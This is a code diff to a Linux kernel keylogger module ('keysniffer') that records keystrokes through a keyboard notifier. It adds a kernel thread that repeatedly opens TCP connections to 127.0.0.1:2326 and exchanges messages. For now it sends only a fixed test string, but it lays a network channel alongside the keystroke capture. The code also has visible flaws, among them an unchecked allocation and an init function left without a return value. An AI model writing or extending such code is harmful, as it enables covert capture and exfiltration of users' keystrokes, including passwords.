@@ -6,6 +6,14 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
+#include <linux/kthread.h>
+#include <linux/slab.h>
+#include <linux/delay.h>
+#include <linux/spinlock.h>
+
+
+#include <net/sock.h>
+
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12			 /* Encoded 'keycode shift' chunk length */
 #define US 0					 /* Type code for US character log */
@@ -35,6 +43,25 @@ static int keysniffer_cb(struct notifier_block *nblock,
 						 unsigned long code,
 						 void *_param);
 
+struct service
+{
+	struct socket *socket;
+	struct task_struct *thread;
+	int running;
+};
+#define PORT 2326
+const char *IP = "127.0.0.1";
+unsigned int inet_addr(char *str)
+{
+    int a, b, c, d;
+    char arr[4];
+    sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
+    arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;
+    return *(unsigned int *)arr;
+}
+
+DEFINE_SPINLOCK(lock);
+struct service *svc;
 /* Definitions */
 
 /*
@@ -164,7 +191,103 @@ static const char *us_keymap[][2] = {
 
 static size_t buf_pos;
 static char keys_buf[BUF_LEN] = {0};
+int recv_msg(struct socket *sock, unsigned char *buf, int len) 
+{
+	struct msghdr msg;
+	struct kvec iov;
+	int size = 0;
 
+	iov.iov_base = buf;
+	iov.iov_len = len;
+
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_flags = 0;
+	msg.msg_name = 0;
+	msg.msg_namelen = 0;
+
+	size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
+
+	printk(KERN_ALERT "the message is : %s\n",buf);
+
+	return size;
+}
+
+int send_msg(struct socket *sock,char *buf,int len) 
+{
+	struct msghdr msg;
+	struct kvec iov;
+	int size;
+
+	iov.iov_base = buf;
+	iov.iov_len = len;
+
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_flags = 0;
+	msg.msg_name = 0;
+	msg.msg_namelen = 0;
+
+	size = kernel_sendmsg(sock, &msg, &iov, 1, len);
+
+	printk(KERN_INFO "message sent!\n");
+
+	return size;
+}
+
+int start_sending(void)
+{
+	int error, i, size, ip;
+	struct sockaddr_in sin;
+	int len = 15;
+	unsigned char buf[len+1];
+	const char text[] = "hello world!\n";
+
+	//ip = (10 << 24) | (1 << 16) | (1 << 8) | (3);
+	//sin.sin_addr.s_addr = htonl(ip);
+    sin.sin_addr.s_addr = inet_addr(IP);
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(PORT);
+
+	i = 0;
+	printk("START_SENDING1 \n");
+	while (!kthread_should_stop()) {
+		error = sock_create_kern(&init_net,AF_INET, SOCK_STREAM, IPPROTO_TCP, &svc->socket);
+		if(error<0) {
+			printk(KERN_ERR "cannot create socket %d\n", error);
+			spin_lock(&lock);
+			svc->running = 0;
+			spin_unlock(&lock);
+			return -1;
+		}
+
+		error = kernel_connect(svc->socket, (struct sockaddr*)&sin,
+				sizeof(struct sockaddr_in), 0);
+		if(error<0) {
+			printk(KERN_ERR "cannot connect socket %d\n", error);
+			spin_lock(&lock);
+			svc->running = 0;
+			spin_unlock(&lock);
+			return -1;
+		}
+		printk(KERN_ERR "sock %d connected\n", i++);
+
+		strncpy((char*)&buf, &text[0], 14);
+		send_msg(svc->socket, buf, 13);
+		size = recv_msg(svc->socket, buf, len);
+
+		kernel_sock_shutdown(svc->socket, SHUT_RDWR);
+		msleep(1000);
+	}
+	sock_release(svc->socket);
+
+	spin_lock(&lock);
+	svc->running = 0;
+	spin_unlock(&lock);
+
+	return 0;
+}
 const struct file_operations keys_fops = {
 	.owner = THIS_MODULE,
 	.read = keys_read,
@@ -268,13 +391,34 @@ static int __init keysniffer_init(void)
 		return -ENOENT;
 	}
 
+	//lock = __SPIN_LOCK_UNLOCKED(lock);	
+	svc = kmalloc(sizeof(struct service), GFP_KERNEL);
+
+	spin_lock(&lock);
+	svc->running = 1;
+	spin_unlock(&lock);
+
+	svc->thread = kthread_run((void *)start_sending, NULL, "echo-client");
+	printk(KERN_ALERT "echo-client module loaded\n");
+
 	register_keyboard_notifier(&keysniffer_blk);
-
-
 }
 
 static void __exit keysniffer_exit(void)
 {
+	spin_lock(&lock);
+	if (svc->running)
+	{
+		spin_unlock(&lock);
+		kthread_stop(svc->thread);
+	}
+	else
+	{
+		spin_unlock(&lock);
+	}
+
+	kfree(svc);
+	printk(KERN_ALERT "removed client-serv module\n");
 	unregister_keyboard_notifier(&keysniffer_blk);
 	debugfs_remove_recursive(subdir);
 }
